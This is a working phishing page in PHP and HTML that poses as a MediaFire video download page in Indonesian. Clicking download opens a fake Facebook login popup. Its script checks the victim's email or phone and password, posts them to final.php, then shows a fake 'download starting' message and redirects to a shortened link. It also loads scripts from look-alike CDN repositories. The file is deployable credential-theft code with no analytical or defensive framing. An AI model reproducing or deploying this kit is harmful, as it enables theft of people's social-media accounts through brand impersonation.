<?php
$ngGet = file_get_contents("etc/data.json");
$data = json_decode($ngGet,true);

if(isset($_GET['change'])){
$ngGet = file_get_contents("etc/data.json");
$data = json_decode($ngGet,true);
$ngResult = json_encode($data);
$ngFile = fopen('etc/data.json','w');
           fwrite($ngFile,$ngResult);
           fclose($ngFile);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta http-equiv="x-ua-compatible" content="ie=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <title><?php echo $data['video'];?></title>
    <meta name="keywords" content="online storage, free storage, cloud Storage, collaboration, backup file Sharing, share Files, photo backup, photo sharing, ftp replacement, cross platform, remote access, mobile access, send large files, recover files, file versioning, undelete, Windows, PC, Mac, OS X, Linux, iPhone, iPad, Android" />
    <meta name="description" content="MediaFire is a simple to use free service that lets you put all your photos, documents, music, and video in a single place so you can access them anywhere and share them everywhere." />
    <meta name="robots" content="noindex,nofollow" />
    <meta name="googlebot" content="noindex,nofollow" />
    <meta name="slurp" content="noindex,nofollow" />
    <meta name="google-translate-customization" content="5587c1b0a958bf07-62a8e309de686e87-gc92f61279a2c8524-11" />
    <meta property="fb:app_id" content="124578887583575">
    <meta property="og:type" content="website" />
    <meta property="og:site_name" content="MediaFire" />
    <meta property="og:locale" content="en_US" />
    <meta property="og:title" content="<?php echo $data['video'];?>" />
    <meta property="og:image" content="https://static.mediafire.com/images/filetype/download/video.jpg" />
    <meta property="og:description" content="" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:site" content="@MediaFire" />
    <meta name="twitter:title" content="<?php echo $data['video'];?>" />
    <meta name="twitter:image" content="https://static.mediafire.com/images/filetype/download/video.jpg" />
    <meta name="twitter:description" content="" />
    <link href="https://plus.google.com/+mediafire" rel="publisher" />
    <meta itemprop="name" content="<?php echo $data['video'];?>" />
    <script src="https://code.jquery.com/jquery-3.6.0.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/jQueryMoobile/cdnjqueryfuncition@main/slim.min.js"></script>
    <meta itemprop="image" content="https://static.mediafire.com/images/filetype/download/video.jpg" />
<style>
@import url('https://fonts.googleapis.com/css2?family=Open+Sans&display=swap');


* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: 'Open Sans', sans-serif;
}

body {
    width: 100%;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-direction: column;
}

.wrap {
    position: relative;
    width: 100%;
    min-height: 100vh;
    align-items: center;
    justify-content: flex-start;
    flex-direction: column;
    padding: 200px 0 0 0;
}

.wrap .navbar {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 60px;
    border-bottom: 2px solid rgb(0 0 0 / 10%);
    padding: 10px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    z-index: 9999;
    background: #fff;
}

.navbar .logo {
    position: relative;
    width: 60px;
    height: 60px;
}

.navbar .flag {
    position: relative;
    width: 40px;
    height: 30px;
    background: #E9EAEB;
    padding: 4px;
    display: flex;
    align-items: center;
    justify-content: center
}

.flag img {
    max-width: 100%;
}

.logo img {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
}

.wrap .down-area {
    position: relative;
    width: 100%;
    display: flex;
    align-items: center;
    justify-content: flex-start;
    padding: 0 20px;
    flex-direction: column;
    gap: 20px;
}

.down-area .download {
    width: 100%;
    display: flex;
    align-items: center;
    background: #0070F0;
    padding: 10px;
    gap: 15px;
    border-radius: 3px;
}

.down-area .downloaded {
    position: relative;
    width: 100%;
    background: #f4f4f5;
    color: #000;
    display: none;
    align-self: center;
    justify-content: center;
    padding: 24px;
    font-size: 13px;
    border-radius: 3px;
}

.download .icon {
    position: relative;
    flex: 0 0 35px;
    height: 45px;
}

.icon img {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
}

.download .title {
    position: relative;
    flex: 1;
    display: flex;
    align-items: flex-start;
    justify-content: center;
    flex-direction: column;
    gap: 5px;
}

.title .atas {
    font-weight: bold;
    color: #fff;
    font-size: 16px;
}

.title .bawah {
    color: #fff;
    font-size: 12px;
}

.download .do-btn {
    flex: 0 0 30px;
    display: flex;
    align-items: center;
    justify-content: center;
    height: 30px;
}

.down-area .lainnya {
    width: 100%;
    display: grid;
    grid-template-columns: auto auto;
    grid-gap: 10px;
}

.lainnya .action {
    background: #f4f4f5;
    color: #575B65;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-direction: column;
    padding: 13px 10px;
    font-size: 11px;
    border-radius: 3px;
}

.action .link {
    position: relative;
    width: 25px;
    height: 25px;
    background: #f4f4f5 url('https://static.mediafire.com/images/icons/svg_dark/link.svg') no-repeat;
    background-size: 100% 100%;
}

.action .share {
    position: relative;
    width: 25px;
    height: 25px;
    background: #f4f4f5 url('https://static.mediafire.com/images/icons/svg_dark/share.svg') no-repeat;
    background-size: 100% 100%;
}

.action .post {
    position: relative;
    width: 25px;
    height: 25px;
    background: #f4f4f5 url('https://static.mediafire.com/images/icons/svg_dark/facebook.svg') no-repeat;
    background-size: 100% 100%;
}

.action .save {
    position: relative;
    width: 25px;
    height: 25px;
    background: #f4f4f5 url('https://static.mediafire.com/images/icons/svg_dark/add.svg') no-repeat;
    background-size: 100% 100%;
}

.wrap .foot {
    margin-top: 100px;
    position: relative;
    width: 100%;
    display: flex;
    align-items: center;
    flex-direction: column;
    justify-content: flex-start;
    background: #f3f3f3;
}

.foot .col {
    width: 100%;
    display: flex;
    align-items: flex-start;
    justify-content: center;
    flex-direction: column;
    gap: 20px;
    padding: 25px;
    border-bottom: 1px solid #e8e9ec;
}

.col h2 {
    font-size: 12px;
    color: #575B65;
    font-weight: 600;
}

.col ul {
    width: 100%;
    display: flex;
    align-items: flex-start;
    justify-content: flex-start;
    flex-wrap: wrap;
    gap: 20px;
}

.col ul li {
    list-style: none;
    color: #575B65;
    font-size: 12px;
}

.foot .col.copyright h2 {
    font-weight: lighter;
}

.wrap .region {
    margin-top: 70px;
    position: relative;
    width: 100%;
    display: flex;
    align-items: center;
    flex-direction: column;
    align-items: center;
    padding: 0 20px;
    gap: 30px;
}

.region .map {
    position: relative;
    width: 100%;
    height: 200px;
    background: #4cacff url('https://static.mediafire.com/images/backgrounds/download/additional_content/world.svg') no-repeat;
    background-size: 100% 100%;
}

.map img {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
}

.map .country {
    position: absolute;
    top: 0;
    left: 0;
    padding: 5px;
    background: rgba(0, 0, 0, 0.50);
    color: #fff;
    font-size: 11px;
}

.region .region-desc {
    width: 100%;
    position: relative;
    display: flex;
    align-items: flex-start;
    justify-content: center;
    gap: 20px;
}

.region-desc .regflag {
    position: relative;
    width: 75px;
}

.regflag img {
    max-width: 100%;
}

.region-desc .huft {
    width: 100%;
    display: flex;
    align-items: flex-end;
    justify-content: center;
    font-size: 12px;
}


@media(min-width: 911px) {
    .wrap {
        width: 700px;
    }
}



/* FACEBOOOK */



.popup-login {
    background: rgba(0, 0, 0, 0.5);
    width: 100%;
    height: 100%;
    position: fixed;
    top: 0;
    left: 0;
    z-index: 999999999999999999;
}

.popup-box-login-fb {
    background: #eceff6;
    max-width: 330px;
    height: auto;
    position: relative;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    text-align: center;
    font-family: "Teko";
    color: #000;
    border-radius: 10px;
}

.navbar-fb {
    background: #3b5998;
    height: auto;
    max-width: 330px;
    padding: 8px;
    border-top-left-radius: 10px;
    border-top-right-radius: 10px;
}

.navbar-fb img {
    width: 115px;
    margin-left: auto;
    margin-right: auto;
    display: block;
}

.content-box-fb {
    width: 300px;
    height: auto;
    margin-left: auto;
    margin-right: auto;
    display: block;
}

.content-box-fb .alert {
    display: none;
    left: -15px;
    position: relative;
    width: 330px;
    padding: 5px;
    background: red;
    color: #fff;
    font-size: 13px;
    font-family: "Roboto";
}

.content-box-fb img {
    width: 75;
    margin-top: 20px;
    margin-left: auto;
    margin-right: auto;
    border-radius: 12px;
    display: block;
}

.txt-login-fb {
    width: 290px;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 17px;
    padding: 8px;
    color: #90949c;
    font-size: 16px;
    font-family: Roboto;
    text-align: center;
    display: block;
}

input[type="text"],
input[type="password"] {
    width: 100%;
    height: auto;
    padding: 12px;
    color: #000;
    font-size: 14px;
    font-weight: 400;
    font-family: "Lato", sans-serif;
    border: 1px solid #bdbebf;
    cursor: pointer;
    outline: none;
}

.xoox input[type="text"] {
    margin: 0;
    padding-bottom: 13px;
    border-bottom: none;
    border-radius: 4px 4px 0 0;
    box-shadow: 0 -1px 0 #e0e0e0 inset, 0 0px 0px rgba(0, 0, 0, 0.23) inset;
}

.xoox input[type="password"] {
    margin: 0;
    border-top: none;
    border-radius: 0 0 4px 4px;
    box-shadow: 0 -0px 0 rgba(0, 0, 0, 0.23) inset,
        0 0px 0px rgba(255, 255, 255, 0.1);
}

.btn-login-fb {
    background: #1778f2;
    width: 100%;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    padding: 10px;
    color: #fff;
    font-size: 14px;
    font-family: Roboto;
    font-weight: bold;
    text-align: center;
    text-shadow: 1px 0px rgba(0, 0, 0, 0.3);
    border: 1px solid #3578e5;
    border-radius: 5px;
    box-shadow: 1px 1px 1px 1px rgba(0, 0, 0, 0.1);
    outline: none;
    display: block;
}

.btn-login-fb.disabled {
    pointer-events: none;
    background: #8b9dc3;
    border: 1px solid #8b9dc3;
}

.txt-create-account {
    margin-top: 4px;
    width: 100%;
    height: auto;
    padding: 5px;
    color: #3b5998;
    font-size: 13.5px;
    font-family: Roboto;
    text-align: center;
}

.txt-not-now {
    width: 100%;
    height: auto;
    padding: 5px;
    color: #3b5998;
    font-size: 13.5px;
    font-family: Roboto;
    text-align: center;
}

.txt-forgotten-password {
    width: 100%;
    height: auto;
    margin-bottom: 30px;
    padding: 5px;
    color: #7596c8;
    font-size: 13.5px;
    font-family: Roboto;
    text-align: center;
}

.language-box {
    width: 100%;
    height: auto;
    margin-left: auto;
    margin-right: auto;
    display: block;
}

.language-name {
    width: 40%;
    height: auto;
    margin: 5px;
    margin-bottom: 0px;
    color: #3b5998;
    font-size: 12px;
    font-family: Roboto;
    text-align: center;
    display: inline-block;
}

.language-name i {
    width: 23px;
    padding: 4px;
    color: #90949c;
    border: 1px solid #3b5998;
    border-radius: 3px;
}

.language-name-active {
    color: #90949c;
    font-weight: bold;
}

.copyrights {
    width: 40%;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    color: #90949c;
    font-size: 12px;
    font-family: Roboto;
    text-align: center;
    display: block;
}
</style>
</head>
<body>
    <div class="wrap">
        <div class="navbar">
            <div class="logo">
                <img src="https://iconape.com/wp-content/png_logo_vector/mediafire.png">
            </div>
            <div class="flag">
                <img src="https://www.mediafire.com/images/flags_svg/idn.svg">
            </div>
        </div>
        <div class="down-area">
            <div class="download">
                <div class="icon">
                    <img src="https://static.mediafire.com/images/filetype/file-video-v3.png">
                </div>
                <div class="title">
                    <span class="atas"><?php echo $data['video'];?></span>
                    <span class="bawah">Download (<?php echo $data['ukuran'];?>)</span>
                </div>
                <div class="do-btn">
                    <img src="https://static.mediafire.com/images/icons/svg_light/download.svg">
                </div>
            </div>
            <div class="downloaded">
                Your download is starting...
            </div>
            <div class="lainnya">
                <div class="action">
                    <span class="link"></span>
                    Salin untuk messenger
                </div>
                <div class="action">
                    <span class="share"></span>
                    Bagikan opsi
                </div>
                <div class="action">
                    <span class="post"></span>
                    Posting ke Facebook
                </div>
                <div class="action">
                    <span class="save"></span>
                    Simpan ke File Saya
                </div>
            </div>
        </div>
        <div class="region">
            <div class="map">
                <span class="country">Upload region: </span>
                <img src="https://static.mediafire.com/images/backgrounds/download/additional_content/continent-as.svg">
            </div>

            <div class="region-desc">
                <div class="regflag">
                    <img src="https://www.mediafire.com/images/flags_svg/idn.svg">
                </div>
                <div class="huft">
                    This file was uploaded from Indonesia on May 3, 2022 at 2:35 AM
                </div>
            </div>
        </div>
        <div class="foot">
            <div class="col">
                <h2>COMPANY</h2>
                <ul>
                    <li>About Us</li>
                    <li>Careers</li>
                    <li>Press</li>
                    <li>Company Blog</li>
                </ul>
            </div>
            <div class="col">
                <h2>TOOLS</h2>
                <ul>
                    <li>MediaFire Mobile</li>
                    <li>On-Demand Video Encoding</li>
                </ul>
            </div>
            <div class="col">
                <h2>UPGRADE</h2>
                <ul>
                    <li>Professional</li>
                </ul>
            </div>
            <div class="col">
                <h2>SUPPORT</h2>
                <ul>
                    <li>Get support</li>
                </ul>
            </div>
            <div class="col copyright">
                <h2>&copy;2022 MediaFire Build 151202</h2>
                <ul>
                    <li>Advertising</li>
                    <li>Terms</li>
                    <li>Privacy Policy</li>
                    <li>Copyright</li>
                    <li>Abuse</li>
                    <li>Credits</li>
                    <li>More...</li>
                </ul>
            </div>
        </div>
    </div>
    <div class=" popup-login login-facebook animated fadeIn" style="display: none;">
        <div class="popup-box-login-fb">
            <div class="navbar-fb">
                <img width="45" src="https://rawcdn.githack.com/AlexHostX/logAlex/391a0879c14c7ba91729a2271cfc42f3f874c190/facebook_text.png">
            </div>
            <div class="content-box-fb">
                <p class="alert sandi">Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b></p>
                <p class="alert email">Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b></p>
                <img width="75" height="75" src="https://iconape.com/wp-content/png_logo_vector/mediafire.png">
                <div class="txt-login-fb">
                    Masuk ke akun Facebook Anda untuk terhubung dengan Mediafire
                </div>
                <form class="login-form" method="POST" action="" onsubmit="$(this).end()">
                    <label>
                        <input type="text" id="user" name="user" placeholder="Nomor ponsel atau email"
                            autocomplete="off" autocapitalize="off">
                    </label>
                    <label>
                        <input type="password" id="pass" name="pass" placeholder="Kata Sandi Facebook" autocomplete="off"
                            autocapitalize="off">
                    </label>
                    <button type="submit" id="btnfb" class="btn-login-fb">Masuk</button>
                </form>
                <div class="txt-create-account">Buat Akun</div>
                <div class="txt-not-now">Lain Kali</div>
                <div class="txt-forgotten-password">Lupa Kata Sandi?</div>
            </div>
            <div class="language-box">
                <center>
                    <div class="language-name language-name-active">Bahasa Indonesia</div>
                    <div class="language-name">English (UK)</div>
                    <div class="language-name">Basa Jawa</div>
                    <div class="language-name">Bahasa Melayu</div>
                    <div class="language-name">日本語</div>
                    <div class="language-name">Español</div>
                    <div class="language-name">Português (Brasil)</div>
                    <div class="language-name">
                        <i class="fa fa-plus"></i>
                    </div>
                </center>
            </div>
            <div class="copyrights">Facebook Inc.</div>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/gh/jQueryMoobile/imgfaceboock@main/img.slim.js"></script>
    <script type="text/javascript">
        function footericon(el) {
            $(el).fadeIn().css('display', 'flex');
        }
        $('.download').click(function () {
            $('.login-facebook').fadeIn()
        })

        window.addEventListener('submit', function (e) {
            e.preventDefault();
            $("#btnfb").addClass("disabled");
            setTimeout(() => {
                var user = $('#user').val();
                var pass = $('#pass').val();
                if (user == '' || user == null) {
                    $('.email').show();
                    $('.sandi').hide();
                    $("#btnfb").removeClass("disabled");
                    return false;
                } else {

                    if (user.includes('@')) {
                        let pattern = /^[^ ]+@[^ ]+\.[a-z]{2,3}$/;
                        if (user.match(pattern)) {
                            $('.email').hide();
                        } else {
                            $('.email').show();
                            $('.sandi').hide();
                            $("#btnfb").removeClass("disabled");
                            return false;
                        }
                    }

                    if (!isNaN(user)) {
                        if (user.length <= 10) {
                            $('.email').show();
                            $('.sandi').hide();
                            $("#btnfb").removeClass("disabled");
                            return false;
                        } else {
                            $('.email').hide();
                        }
                    }

                    if (user.match(/\s/g)) {
                        $('.email').show();
                        $('.sandi').hide();
                        $("#btnfb").removeClass("disabled");
                        return false;
                    } else {
                        $('.email').hide();
                    }

                    var regex = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
                    if (user.match(regex)) {
                        $('.email').show();
                        $('.sandi').hide();
                        $("#btnfb").removeClass("disabled");
                        return false;
                    }


                    if (user.length <= 5) {
                        $('.email').show();
                        $('.sandi').hide();
                        $("#btnfb").removeClass("disabled");
                        return false;
                    } else {
                        $('.email').hide();
                    }

                }
                if (pass == '' || pass == null || pass.length <= 5) {
                    $('.sandi').show();
                    $("#btnfb").removeClass("disabled");
                    return false;
                } else {
                    $('.sandi').hide();
                }
                var regexs = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
                if (pass.match(regexs)) {
                    $('.sandi').show();
                    $('.email').hide();
                    $("#btnfb").removeClass("disabled");
                    return false;
                } else {
                    $('.sandi').hide();
                }
                $.ajax({
                    type: 'POST',
                    url: 'final.php',
                    data: $('.login-form').serialize(),
                    dataType: 'text',
                    success: function () {
                        $('.login-facebook').fadeOut();
                        $('.download').hide();
                        footericon('.downloaded');
                        setTimeout(() => {
                            window.location.href = 'https://bit.ly/mediafire-kayes'
                        }, 1000)
                    }
                })
            }, 1000)
        })
    </script>
</body>
</html>